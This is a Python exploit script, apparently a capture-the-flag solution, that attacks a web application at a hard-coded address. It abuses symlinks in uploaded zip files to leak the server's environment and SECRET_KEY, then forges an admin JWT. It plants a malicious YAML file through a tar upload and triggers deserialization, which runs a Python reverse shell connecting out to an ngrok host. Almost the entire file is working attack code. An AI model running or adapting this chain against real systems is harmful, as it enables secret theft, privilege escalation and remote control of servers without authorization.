#!/usr/bin/env python3

import io
import json
import subprocess
import sys
import tarfile

import jwt
import requests


def craft_malicious_zip(link):
    out_filename = link.split("/")[-1]
    zip_filename = f"{out_filename}.zip"

    subprocess.run(["ln", "-sf", link,
                   out_filename], stdout=subprocess.PIPE)
    subprocess.run(["7z", "a", "-snl", zip_filename,
                   out_filename], stdout=subprocess.PIPE)


def leak_secret_key():
    craft_malicious_zip("/proc/self/environ")
    out_filename = "environ"
    zip_filename = f"{out_filename}.zip"
    out_dir = uploadzip(zip_filename)

    r = s.get(f"{url}/{out_dir}/{out_filename}")
    leaked_env = r.text.split("\x00")
    for e in leaked_env:
        if e.startswith("SECRET_KEY"):
            return e.split("=")[1]


def craft_admin_token(token):
    payload = jwt.decode(
        token,
        SECRET_KEY,
        algorithms=["HS256"],
        leeway=10,
    )
    sub = json.loads(payload['sub'])
    sub['isAdmin'] = True
    payload['sub'] = json.dumps(sub)
    payload = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
    return payload


def tamper_configfile(token, filename):
    payload = jwt.decode(
        token,
        SECRET_KEY,
        algorithms=["HS256"],
    )
    sub = json.loads(payload['sub'])
    sub['configfile'] = filename
    payload['sub'] = json.dumps(sub)
    payload = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
    return payload


def craft_malicious_tar(tar_fn, yaml_fn):
    tar = tarfile.TarFile(tar_fn, "w")
    info = tarfile.TarInfo(yaml_fn)
    payload = f"""\
    !!python/object/apply:subprocess.Popen
    - !!python/tuple
      - /usr/local/bin/python3
      - "-c"
      - "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{HOST}',{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
    """.encode()
    info.size = len(payload)
    info.mode = 0o444  # So it cannot be overwritten

    tar.addfile(info, io.BytesIO(payload))
    tar.close()


def uploadtar(filename):
    file = {
        "file": open(filename, "rb")
    }
    r = s.post(f"{url}/uploadtar", files=file)
    if "Internal Server Error" in r.text:
        print("Please provide other yaml filename")
        quit()


def uploadzip(filename):
    file = {
        "file": open(filename, "rb")
    }
    r = s.post(f"{url}/uploadzip", files=file)
    resp = eval(r.text)
    return resp["filename"]


HOST = "0.tcp.ap.ngrok.io"
PORT = 12798
url = "http://103.185.44.122:49047"

s = requests.session()
s.get(url)
SECRET_KEY = leak_secret_key()
print(f"[+] {SECRET_KEY=}")
token = s.cookies["access_token_cookie"]
admin_token = craft_admin_token(token)
s.cookies["access_token_cookie"] = admin_token
r = s.get(f"{url}/admin")
assert (r.status_code == 200)

try:
    mal_yaml_filename = sys.argv[1]
except IndexError:
    mal_yaml_filename = "evil.yaml"

craft_malicious_zip(f"/app/config/{mal_yaml_filename}")
evil_yaml_dir = uploadzip(f"{mal_yaml_filename}.zip").split("/")[-1]

mal_tar_filename = "mal.tar"
craft_malicious_tar(mal_tar_filename, f"{evil_yaml_dir}/{mal_yaml_filename}")
uploadtar(mal_tar_filename)

admin_token = tamper_configfile(admin_token, mal_yaml_filename)
s.cookies["access_token_cookie"] = admin_token
# Trigger RCE
s.get(url)
